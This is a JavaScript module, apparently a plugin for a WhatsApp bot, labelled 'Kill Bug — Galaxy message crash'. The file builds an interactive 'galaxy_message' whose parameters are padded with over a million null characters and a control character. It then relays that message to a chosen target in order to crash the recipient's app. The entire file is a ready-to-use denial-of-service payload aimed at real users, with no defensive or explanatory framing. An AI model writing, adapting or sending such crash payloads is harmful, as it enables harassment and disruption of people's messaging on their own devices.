// ============================================================
// BUG: kill — Galaxy message crash
// Source: Senku — adapted
// ============================================================

export default {
  id: 'kill',
  name: 'Kill Bug',

  async execute({ sock, target }) {
    const paramsJson = JSON.stringify({
      screen_2_OptIn_0: true,
      screen_2_OptIn_1: true,
      screen_1_Dropdown_0: 'AdvanceBug',
      screen_1_DatePicker_1: '1028995200000',
      screen_1_TextInput_2: 'xwc@xwc.com',
      screen_1_TextInput_3: '94643116',
      screen_0_TextInput_0: 'radio - buttons' + '\u0000'.repeat(1020000),
      screen_0_TextInput_1: '\u0003',
      screen_0_Dropdown_2: '001-Grimgar',
      screen_0_RadioButtonsGroup_3: '0_true',
      flow_token: 'AQAAAAACS5FpgQ_cAAAAAE0QI3s.',
    });

    const msg = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: 'XWC',
              format: 'EXTENSIONS_1',
            },
            nativeFlowResponseMessage: {
              name: 'galaxy_message',
              paramsJson,
              version: 3,
            },
          },
        },
      },
    };

    await sock.relayMessage(target, msg, {
      participant: { jid: target },
    });
  },
};